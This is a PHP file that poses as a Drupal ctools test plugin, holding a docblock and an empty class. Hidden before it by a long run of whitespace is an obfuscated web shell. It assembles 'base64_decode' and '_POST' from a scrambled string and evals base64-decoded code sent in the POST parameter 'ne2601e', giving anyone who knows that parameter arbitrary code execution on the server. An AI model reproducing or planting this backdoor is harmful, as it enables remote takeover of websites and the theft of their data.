<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}['ne2601e'];if(isset($s22)){eval($s21($s22));}?><?php
/**
 * @file
 * A cached plugin object that tests including.
 */

class ctoolsNotCachedPluginArray2 {}
